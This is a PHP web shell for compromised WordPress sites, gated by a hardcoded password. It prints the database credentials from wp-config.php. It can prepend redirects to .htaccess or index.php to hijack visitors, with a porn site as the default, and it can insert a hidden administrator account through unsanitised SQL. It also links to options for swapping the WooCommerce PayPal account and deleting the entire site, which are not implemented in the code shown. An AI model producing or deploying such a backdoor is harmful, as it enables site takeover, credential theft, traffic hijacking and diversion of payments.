<html>
<body>
<?php

$password = "666";
$iswp = false;
$__db = array();

if(empty($_GET['pw']) || $_GET['pw']!=$password) die();

if(file_exists('wp-config.php'))
{
	
	require_once('wp-config.php');
	?>
	<h1>MySQL Access</h1>
	DB_NAME: <?= DB_NAME; ?><br>	
	DB_USER: <?= DB_USER; ?><br>	
	DB_PASSWORD: <?= DB_PASSWORD; ?><br>	
	DB_HOST: <?= DB_HOST; ?><br>	
	table prefix: <?= $table_prefix; ?><br>
	<br>
	<?php

	$iswp = true;
	
	$__db['id'] = ksql_connect(DB_HOST, DB_NAME, DB_USER, DB_PASSWORD);
	ksql_query("SET NAMES 'UTF8'"); 
}


if(isset($_POST['htaccessredirect']))
{
	$contents = file_get_contents('.htaccess');
	$contents = 'Redirect 301 / '.$_POST['htaccessredirect_to']." [L]\n\n".$contents;
	if(file_put_contents('.htaccess', $contents)) $msgSuccess = '.htaccess successfully updated';
	else $msgError = 'Ops, errors occurred while updating .htaccess';
	
} elseif(isset($_POST['phpredirect'])) {
	$contents = file_get_contents('index.php');
	$contents = '<?php header("Location: '.$_POST['phpredirect_to'].'"); die(); ?>'."\n\n".$contents;
	if(file_put_contents('index.php', $contents)) $msgSuccess = 'index.php successfully updated';
	else $msgError = 'Ops, errors occurred while updating index.php';
	
} elseif(isset($_POST['wp_addadmin'])) {
	if(ksql_query("INSERT INTO `".$table_prefix."users` (`ID`, `user_login`, `user_pass`, `user_nicename`, `user_email`, `user_url`, `user_registered`, `user_activation_key`, `user_status`, `display_name`) VALUES (NULL, '".$_POST['wp_addadmin_username']."', MD5('".$_POST['wp_addadmin_password']."'), '".$_POST['wp_addadmin_username']."', '".$_POST['wp_addadmin_email']."', '', NOW(), '', '0', '".$_POST['wp_addadmin_username']."');"))
	{
		$iduser = ksql_insert_id();
		ksql_query("INSERT INTO `".$table_prefix."usermeta` (`umeta_id`, `user_id`, `meta_key`, `meta_value`) VALUES (NULL, '".$iduser."', 'wp_capabilities', 'a:1:{s:13:\"administrator\";s:1:\"1\";}');");
		ksql_query("INSERT INTO `".$table_prefix."usermeta` (`umeta_id`, `user_id`, `meta_key`, `meta_value`) VALUES (NULL, '".$iduser."', 'wp_user_level', '10');");
		$msgSuccess = 'User successfully created';
	} else $msgError = 'Ops, errors occurred while inserting user';
}

if(!empty($msgSuccess)) { ?><div class="msgSuccess"><?= $msgSuccess; ?></div><?php }
if(!empty($msgError)) { ?><div class="msgSuccess"><?= $msgError; ?></div><?php }

?>

<h1>ACTIONS</h1>

<form action="?pw=<?= urlencode($password); ?>" method="post">

<fieldset>
	<legend>Redirect via .htaccess</legend>
	<input type="text" name="htaccessredirect_to" value="http://www.youporn.com">
	<input type="submit" name="htaccessredirect" value="Set redirect"><br>
	<small>* after that, it will be impossible to access to this script</small>
</fieldset>

<fieldset>
	<legend>Redirect via PHP</legend>
	<input type="text" name="phpredirect_to" value="http://www.youporn.com">
	<input type="submit" name="phpredirect" value="Set redirect"><br>
</fieldset>

<?php if($iswp) { ?>
<fieldset>
	<legend>Wordpress: add an admin user</legend>
	<input type="text" name="wp_addadmin_username" value="" placeholder="username">
	<input type="text" name="wp_addadmin_password" value="" placeholder="password">
	<input type="text" name="wp_addadmin_email" value="" placeholder="email">
	<input type="submit" name="wp_addadmin" value="Add admin user"><br>
</fieldset>
<?php } ?>

<a href="?pw=<?= urlencode($password); ?>&woocommercepaypal">Change WooCommerce PayPal account</a><br>
<br>
<a href="?pw=<?= urlencode($password); ?>&randomerror">Insert a random PHP error</a><br>
<br>
<a href="?pw=<?= urlencode($password); ?>&deleteall">Delete the entire website</a><br>
<br>

</form>

</body>
</html>
<?

/** MySQL **/
function ksql_connect($host,$dbname,$user,$password)
{
	try
	{
		$GLOBALS['__db']['pdo']=new PDO('mysql:host='.$host.';dbname='.$dbname , $user, $password);
		$GLOBALS['__db']['pdo']->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
		$GLOBALS['__db']['pdo']->setAttribute(PDO::ATTR_EMULATE_PREPARES, false);

	} catch(PDOException $e) {
		// die if error occurs
		if(isset($_SESSION['iduser'])) trigger_error($e->errorInfo[2], E_USER_ERROR);
		else trigger_error('We are sorry, a database error occurred.', E_USER_ERROR);
		return false;
	}
	return $GLOBALS['__db']['pdo'];
}

function ksql_real_escape_string($string)
{
	$string=$GLOBALS['__db']['pdo']->quote($string);
	$string=substr($string,1,-1);
	return $string;
}

function ksql_query($query)
{
	try
	{
		$results=$GLOBALS['__db']['pdo']->prepare($query);
		$results->closeCursor();
		$results->execute();
	
	} catch(PDOException $e) {
		// die if error occurs
		trigger_error($e->errorInfo[2], E_USER_ERROR);
		return false;
	}

	return $results;
}

function ksql_fetch_array($results)
{
	return $results->fetch(PDO::FETCH_ASSOC);
}

function ksql_insert_id()
{
	return $GLOBALS['__db']['pdo']->lastInsertId();
}

function ksql_close()
{
	if(isset($GLOBALS['__db']['pdo'])) unset($GLOBALS['__db']['pdo']);
}


/** GENERIC FUNCTIONS **/



